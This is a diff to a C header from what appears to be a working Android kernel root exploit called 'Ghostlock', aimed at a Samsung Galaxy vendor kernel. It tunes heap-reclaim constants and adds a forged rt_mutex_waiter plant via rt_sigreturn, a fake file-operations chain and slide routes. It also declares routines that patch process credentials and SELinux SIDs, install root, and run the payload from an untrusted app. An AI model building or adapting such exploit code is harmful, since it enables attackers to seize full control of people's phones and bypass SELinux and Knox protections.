@@ -66,14 +66,43 @@
 #define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)
 #define MM_SLAB_CANDIDATE_PAGES (ORDER3_SIZE / PAGE_SIZE)
 #define PIPE_CANDIDATE_PAGES 8
-#define SKB_SHARED_INFO_ALIGNED 0x140
-#define SKB_SEND_SIZE (ORDER3_SIZE - SKB_SHARED_INFO_ALIGNED)
-#define SKB_RECLAIM_SENDS 4
+#define SKB_SHARED_INFO_ALIGNED 0x180
+/* AF_UNIX splits a send at SKB_MAX_HEAD(0) = PAGE_SIZE - SKB_SHARED_INFO_ALIGNED.
+ * Values below are read out of the vendor vmlinux, not assumed from source:
+ *   unix_stream_sendmsg  mov w10, #0x8e80   -> size clamped to 36480
+ *                        sub w9, w28, #0xe80 -> linear/frag split at 3712
+ * 3712 + ORDER3_SIZE (32768) = 36480, so both immediates agree on a 384-byte
+ * overhead: SKB_WITH_OVERHEAD(4096) = 4096 - 384 = 3712.
+ * The linear head takes buffer[0..3712); the entire frag page is filled from
+ * buffer[3712..36480), so page offset 0 is payload offset 3712.
+ *   data_len = PAGE_ALIGN(size - 3712) = 32768 -> npages 8 -> one order-3 page.
+ * The previous 0x140 (320) put every fake field 64 bytes late in the page.
+ */
+#define SKB_MAX_HEAD_0 (PAGE_SIZE - SKB_SHARED_INFO_ALIGNED)
+#define SKB_FRAG_BIAS SKB_MAX_HEAD_0
+#define SKB_SEND_SIZE (SKB_MAX_HEAD_0 + ORDER3_SIZE)
+/* Killing the prepare children releases ~32 order-3 slabs (32 *
+ * mm_objs_per_slab children).  The buddy allocator hands back the most
+ * recently freed blocks first, so a handful of sends lands on the neighbour
+ * slabs and misses the leaked one; cover every released slab. */
+#define SKB_RECLAIM_SENDS 96
+#define SKB_RECLAIM_DELAY_US 10000
+#define SKB_RECLAIM_SNDBUF (8 << 20)
 #define FOPS_TABLE_OFF FOPS_OFF
-#define SKB_FRAG_BIAS 0
 
 #define FAKE_TASK_PRIO 120
 #define FAKE_WAITER_PRIO 130
+/* Vendor SELinux keeps the legacy int selinux_enforcing instead of
+ * selinux_state.enforcing, and this build places it in .kdp_ro (Knox Data
+ * Protection).  A write from EL1 faults, so the payload must not touch it. */
+#ifndef SELINUX_ENFORCING_KDP_RO
+#define SELINUX_ENFORCING_KDP_RO 0
+#endif
+/* The slide route needs the random_boot_id object.  Some vendor 4.19 trees
+ * do not carry it; then the boot-id restore step is compiled out. */
+#ifndef SLIDE_BOOTID_DATA_PRESENT
+#define SLIDE_BOOTID_DATA_PRESENT 1
+#endif
 #ifndef ASHMEM_NAME_PREFIX_LEN
 #define ASHMEM_NAME_PREFIX_LEN 11
 #endif
@@ -147,9 +176,13 @@
 #define KS_FD_PROTECT_MIN (PSELECT_ROUTE_NFDS + 64)
 void ks_relocate_fd_min(int *fd, int min_fd);
 void exlog_protect_fd(void);
-/* Nice 1 -> prio 121 < FAKE_WAITER_PRIO 130: the PI-tree insert takes
- * the rb_left branch and stays inside the fake page.  Nice >= 10 walks
- * rb_right = ASHMEM_MISC_FOPS into real kernel memory (livelock). */
+/* The punch target holds f_pi_chain with owner_thread blocked on it, so the
+ * kernel keeps it PI-boosted to 120: sched_setattr(nice=1) cannot raise it to
+ * 121.  Measured on the G986U1 - /proc/<tid>/stat field 18 is task_prio(),
+ * i.e. p->prio - 100, and reads 120 after a successful punch.  The plant must
+ * mirror that effective priority, which is why the probe reads it at runtime
+ * instead of using NICE_TO_PRIO(nice).  FAKE_WAITER_PRIO (130) > 120 keeps the
+ * real route walking into the controlled chain. */
 #define PSELECT_CONSUMER_NICE 1
 #define PSELECT_CONSUMER_BURST_CALLS 1
 #define PSELECT_ENTER_DELAY_USEC 50000
@@ -250,10 +283,14 @@ extern atomic_int punch_consume_go;
 extern atomic_int punch_consume_stop;
 extern atomic_int consumer_calls;
 extern atomic_int consumer_success;
+extern atomic_int consumer_walked;
 extern atomic_int consumer_inflight;
 extern atomic_int consumer_last_ret;
 extern atomic_int consumer_last_errno;
 extern atomic_int main_route_delay_usec;
+/* Set by the waiter thread once rt_sigreturn has written the forged
+ * rt_mutex_waiter onto its kernel stack. */
+extern atomic_int plant_ready;
 extern atomic_int cfi_stage_done;
 extern atomic_int pipe_prepare_request;
 extern atomic_int pipe_prepare_done;
@@ -405,6 +442,7 @@ void kill_child(pid_t child);
 void close_reclaim_sockets(void);
 void setup_kernelsnitch(void);
 int kernelsnitch_collisions_ready(void);
+int kernelsnitch_mm_ready(void);
 void run_kernelsnitch_bruteforce(void);
 uintptr_t current_kernelsnitch_mm_struct(void);
 uintptr_t cleanup_kernelsnitch(void);
@@ -414,6 +452,10 @@ void cleanup_page_prepare_state(void);
 int clone_memfd(void);
 void prepare_ctxs(void);
 int prepare_skb_payload(uintptr_t base, int payload_mode);
+uintptr_t page_image_base(void);
+void page_image_report(int fd, const char *tag);
+void ks_page_peek_report(void);
+void ks_page_peek_report_at(const char *tag);
 uintptr_t prepare_kernel_page(int payload_mode);
 uintptr_t prepare_good_kernel_page(int payload_mode);
 
@@ -425,6 +467,66 @@ void open_selected_fds(
     fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd);
 void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
 void do_pselect_fake_lock_route(void);
+/* ---------------- stale-waiter plant geometry ----------------
+ *
+ * __arm64_sys_rt_sigreturn copies 0x200 bytes of fpsimd state from the user
+ * signal frame to entry_sp-0x280, so the 512-byte window covers
+ * [entry_sp-0x280, entry_sp-0x80).
+ *
+ * The stale rt_mutex_waiter left by the failed FUTEX_*_PI requeue is at
+ * entry_sp-0x190 on this build.  The 2026-11-02 lane test planted the
+ * victim's own priority only at lane 38; the punch then returned without a
+ * fault, so rt_mutex_adjust_pi()'s equal-priority gate read lane 38 as
+ * waiter->prio and the waiter base is lane 30 (target.h
+ * SIGRET_WAITER_LANE), i.e. the whole 0x50-byte object at lanes 30..39.
+ * The earlier entry_sp-0x270 / lane 2 reading was a window-shift artefact
+ * and is refuted: no other lane can produce that early return.
+ *
+ * SIGRET_WAITER_LANE is the waiter's qword index in the 64-qword plant
+ * buffer.  The #ifndef fallback must never be used for a target that has not
+ * measured it.
+ */
+#define WAITER_PLANT_LANES 32
+#define PLANT_SIGNAL 40
+#ifndef SIGRET_WAITER_LANE
+#define SIGRET_WAITER_LANE 2
+#endif
+#ifndef SYS_tgkill
+#define SYS_tgkill 131
+#endif
+#ifndef SYS_gettid
+#define SYS_gettid 178
+#endif
+#ifndef SYS_getpid
+#define SYS_getpid 172
+#endif
+
+/* Deterministic stale-waiter plant (see target.h SIGRET_WAITER_LANE). */
+int plant_waiter_install(void);
+void plant_waiter_all(uint64_t value);
+int victim_effective_prio(int tid);
+/* 1 only when the post-punch readback proves the chain completed on
+ * our fake page (ashmem_misc.fops == fake_fops). */
+int punch_walk_marker(void);
+void plant_shallow(void);
+int plant_fdset_at_futex_depth(void);
+extern int plant_shallow_done;
+extern int plant_pad_current;
+void plant_waiter(uint64_t task, uint64_t lock, int prio);
+void plant_waiter_fake(uint64_t task, uint64_t lock, int prio, uint64_t pc,
+                       uint64_t right, uint64_t left);
+void plant_waiter_uniform(uint32_t prio);
+void plant_waiter_zero_range(uint32_t prio, int lo, int hi);
+extern uint64_t plant_fp_readback[8];
+extern int plant_fp_mismatch;
+extern volatile sig_atomic_t plant_hits;
+extern int plant_pid;
+extern int plant_prio_used;
+extern int plant_victim_nice;
+extern int plant_signal_tid;
+extern int plant_delivery_failed;
+extern long plant_adjtimex_ret;
+extern long plant_adjtimex_errno;
 
 int slide_pselect_words_per_set(void);
 int slide_pselect_global_word(int waiter_word);
@@ -438,6 +540,8 @@ void slide_pselect_put_waiter_word(
     fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
     int waiter_word, uint64_t value, const char *name);
 void prepare_slide_select_fdsets(fd_set *in, fd_set *out, fd_set *ex);
+int slide_pselect_waiter_shift(void);
+void prepare_punch_select_fdsets(fd_set *in, fd_set *out, fd_set *ex);
 void fdset_put_bitmap_value(fd_set *set, int word, uint64_t value);
 void open_slide_selected_fds(
     fd_set *in, fd_set *out, fd_set *ex, int read_fd);
@@ -507,5 +611,13 @@ int patch_cred_identity(int fd, uintptr_t cred);
 int patch_cred_sid(int fd, uintptr_t cred);
 int patch_cred_object(int fd, uintptr_t cred);
 int install_android_root(int fd);
+
+/* Staging directory for payload artefacts (su client, socket, log, bridge
+ * files).  The Ghostlock app runs this payload as an untrusted app uid, which
+ * has no write access to /data/local/tmp, so it passes its own writable
+ * directory in GHOSTLOCK_DIR.  Unset preserves the adb/shell default. */
+const char *ghostlock_dir(void);
+/* "<ghostlock_dir()>/<leaf>" in a small ring of static buffers. */
+const char *ghostlock_path(const char *leaf);
 
 #endif
